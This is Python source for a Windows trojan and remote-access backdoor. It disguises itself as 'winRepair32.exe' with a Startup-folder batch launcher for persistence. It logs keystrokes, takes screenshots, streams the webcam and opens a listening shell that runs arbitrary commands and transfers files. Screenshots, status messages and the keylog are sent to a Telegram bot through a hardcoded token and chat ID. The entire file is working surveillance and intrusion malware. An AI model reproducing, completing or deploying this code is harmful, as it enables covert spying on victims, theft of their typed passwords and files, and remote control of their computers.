import socket     
import threading as the 
import subprocess as pipe
import os, keyboard, telepot
import struct, pickle
import cv2, datetime , random

__Cam__Send = True
__Cam__Recv = True


_UserName = os.getlogin()

_Name_trojan = "winRepair32.exe"
_Name_Launcher = "WinSecurity.bat"

_Worm_Lacher_Path = ["C:\\Users\\" + _UserName +"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
                     "C:\\Users\\" + _UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\Programs",
                     "C:\\Users\\" + _UserName + "\\AppData\\Roaming\\Microsoft\\Windows",
                     "C:\\Users\\" + _UserName +"\\AppData"]

_Worm_Exe_Path = ["C:\\Users\\" + _UserName,
                  "C:\\Users\\" + _UserName +"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs",
                  "C:\\Users\\" + _UserName +"\\AppData\\Roaming\\Microsoft\Windows",
                  "C:\\Users\\" + _UserName +"\\AppData"]


_Local_Host = '127.0.0.1'

_time = datetime.datetime.now()
_Today_Date = datetime.date.today()


_Device_Name = socket.gethostname()
IP_ADDRESS = socket.gethostbyname(_Device_Name)
print(IP_ADDRESS)

_File_path=os.path.dirname(os.path.abspath(__file__))
_keylogger_Path = _File_path + "\\"+ 'keylog.txt'

TOKEN = '5852335164:AAGQsSYtHEl79sD4hgNGrBlqp2c85cyJ3Wc'
CHAT_ID = 1686186521

if IP_ADDRESS != _Local_Host:
    _Bot = telepot.Bot(TOKEN)


Network = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
Network.bind((IP_ADDRESS,8485))
Network.listen()
connection = Network.makefile('wb')


with open(_keylogger_Path,'a') as file:
    file.write("\n")
    file.write("############################### :: DATE  ::  ################################")
    file.write("\n")
    file.write(f" :: [{_Today_Date}] :: " + _UserName)

def Send_message(msg):
    _Bot.sendMessage(CHAT_ID, _UserName +" : " +  msg + " : " + IP_ADDRESS)

def ScreenShot():
    try:
        import pyautogui
        name = 'ScreenShots'
        pyautogui.screenshot().save(_File_path + "\\"+ name + '.png')
        img = open(name + '.png','rb')
        _Bot.sendPhoto(CHAT_ID,img)
        os.remove(_File_path + "\\"+ name + '.png')
    except:
        pass

def _Cam_Recv():
    try:
        cons ,adre = Network.accept()
        data = b""
        payload_size = struct.calcsize(">L")
        while __Cam__Recv:
            while len(data) < payload_size:
                data += cons.recv(4096)
            packed_msg_size = data[:payload_size]
            data = data[payload_size:]
            msg_size = struct.unpack(">L", packed_msg_size)[0]
            while len(data) < msg_size:
                data += cons.recv(4096)
            frame_data = data[:msg_size]
            data = data[msg_size:]
            frame=pickle.loads(frame_data, fix_imports=True, encoding="bytes")
            frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
            cv2.imshow('Hacker',frame)
            cv2.waitKey(1)
        cons.close()
    except:
        cons.close()

def _Cam_Send():
    try:
        Con , adress = Network.accept()
        Cam = cv2.VideoCapture(0)
        Cam.set(3, 1920)
        Cam.set(4, 1080)
        encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
        while __Cam__Send:
            ret, frame = Cam.read()
            result, frame = cv2.imencode('.jpeg', frame, encode_param)
            data = pickle.dumps(frame, 0)
            size = len(data)
            Con.sendall(struct.pack(">L", size) + data)
        Cam.release()
        Con.close()
    except:
        Con.close()

def Send_FIle(Command,Current_Path):
    COnnection , adresss = Network.accept()
    try:
        f = open(Current_Path + "\\" + Command.split(" ")[1],'rb')
        buffer_size = os.path.getsize(Current_Path + "\\" + Command.split(" ")[1])
        COnnection.send(str(buffer_size).encode())
        data = f.read()
        while (data):
            COnnection.send(data)
            data = False
            f.close()
    except:
        COnnection.send("Error while on file".encode())

def Get_FIle(Command):
    COnnection , adresss = Network.accept()
    buffer_size=COnnection.recv(2048).decode()
    if buffer_size != "Error while on file":
        with open(Command.split(" ")[1], 'wb') as file:
            data = COnnection.recv(int(buffer_size))
            if not data:
                print("break")
            file.write(data)
            file.close()

def on_key_press(event):
    with open(_keylogger_Path, 'a') as f:
        if format(event.name) == 'space':
            f.write(" ")
        elif format(event.name) == ('backspace' or 'shit' or 'up' or 'down' or 'left' or 'right' or 'alt'):
            f.write("  :" + format(event.name) + ":")
        elif format(event.name) == 'enter':
            f.write('\n')
        else:
            f.writelines(format(event.name))
    
def _Key_Loggy_():
    keyboard.on_press(on_key_press)
    keyboard.wait()

def Timer(interval_Sec,fuction):
    the.Timer(interval=interval_Sec,function=fuction).start()

def  _Recreate_Launcher():
    with open(f"C:\\Users\\{_UserName}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{_Name_Launcher}",'a') as f:
        f.write("@echo off")
        f.write("\n")
        paths = r'"' +os.path.expanduser("~") + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs" + r'"'
        f.write(f'cd {paths}  && start /B {_Name_trojan} ')

def restart():
    import sys
    print("Restart")
    os.execv(sys.executable, ['python'] + sys.argv)

def _Offilne_Function():
    ScreenShot()
    lol =True
    global _time
    while True:
        _30Min = datetime.datetime.now().minute - _time.minute

        if not os.path.exists("C:\\Users\\"+ _UserName +f"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{_Name_Launcher}"):
            _Recreate_Launcher()

        if _30Min >= 30:
            os.remove(f"C:\\Users\\{_UserName}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{_Name_Launcher}")
            _Recreate_Launcher()
            ScreenShot()
            Send_message("Connection  Contiunes.. at " + str(datetime.datetime.now()))
            _time = datetime.datetime.now()

        if IP_ADDRESS == _Local_Host:
            if lol:
                print("wait 60 sec")
                Timer(60,restart)
                lol=False
                
        if (datetime.datetime.now().hour == 3 and datetime.datetime.now().minute == 30 and datetime.datetime.now().second == 0):
            doc = open(_keylogger_Path,'rb')
            _Bot.sendDocument(CHAT_ID,doc)


class Shell_BackDoor(the.Thread):
    def __init__(self) -> None:
        super(Shell_BackDoor,self).__init__()
        self._stop_event = the.Event()

    def stop(self):
        self._stop_event.set()

    def join(self, *args, **kwargs):
        self.stop()
        super(Shell_BackDoor,self).join(*args, **kwargs)

    def run(self):
        while not self._stop_event.is_set():
            try:
                Current_Path=os.getcwd()
                Command = Hacker_Machine.recv(2048).decode()

                if Command.split(" ")[0] == "cd":
                    try:
                        os.chdir(Command.split(" ")[1])
                        Current_Path =  os.getcwd()
                        Hacker_Machine.send(Current_Path.encode())
                    except:
                        Hacker_Machine.send("Error On Direactory".encode())
                elif Command.split(" ")[0] == "@thief":
                    Send_FIle(Command=Command,Current_Path=Current_Path)
                elif Command.split(" ")[0] == "@send":
                    Get_FIle(Command)

                elif Command.split(" ")[0] == '@Need_key':
                    Hacker_Machine.send(str(os.path.getsize(_keylogger_Path)).encode())
                    with open(_keylogger_Path,'a') as file:
                        Network.send(file.read())

                elif Command.split(" ")[0] == "@cam":
                    if Command.split(" ")[1] == "cast":
                        if Command.split(" ")[2] == "close":
                            try:
                                __Cam__Recv=False
                                Hacker_Machine.send("Camera Connection Was Succefully Closed".encode())
                            except:
                                Hacker_Machine.send("Camera Connection Was Did't Closed".encode())
                        elif Command.split(" ")[2] == "start":
                            __Cam__Recv =True
                            Cam_rec = the.Thread(target=_Cam_Recv).start()
                            Hacker_Machine.send("CAmera Connection SUccefully COnnected".encode())

                    elif Command.split(" ")[1] == "show":
                        if Command.split(" ")[2] == "close":
                            try:
                                __Cam__Send=False
                                Hacker_Machine.send("Camera Connection Was Succefully Closed".encode())
                            except:
                                Hacker_Machine.send("Camera Connection Was Did't Closed".encode())

                        elif Command.split(" ")[2] == "start":
                            __Cam__Send=True
                            Cam_send = the.Thread(target=_Cam_Send).start()
                            Hacker_Machine.send("CAmera Connection SUccefully COnnected".encode())

                elif Command.split(" ")[0] == "dir":
                    Shell = pipe.Popen(f"cd {Current_Path} & "+Command,shell=True,stdout=pipe.PIPE,stderr=pipe.PIPE)
                    output = Shell.stdout.read()
                    Hacker_Machine.send(str(output).encode())

                elif Command.split(" ")[0] == '@screenshot':
                    ScreenShot()

                elif Command.split(" ")[0] == "@Connection":
                    if Command.split(" ")[1] == "close":
                        break
                else:
                    Shell = pipe.Popen(f"cd {Current_Path} & "+Command,shell=True,stdout=pipe.PIPE,stderr=pipe.PIPE)
                    output = Shell.stdout.read()
                    Hacker_Machine.send(str(output).encode())
                    Hacker_Machine.send(str(Shell.stderr.read()).encode())
                    Hacker_Machine.send(Current_Path.encode())
            except:
                self.stop()
                Network.close()

_Key_Logger_ = the.Thread(target=_Key_Loggy_).start()
__Offilne_Function__ = the.Thread(target=_Offilne_Function).start()

while True:
    if IP_ADDRESS != _Local_Host:
        Send_message("Connection Establishte")
        Hacker_Machine, Hacker_Adress = Network.accept()
        _Shell = Shell_BackDoor().run()

    elif IP_ADDRESS == _Local_Host:
        IP_ADDRESS = socket.gethostbyname(_Device_Name)
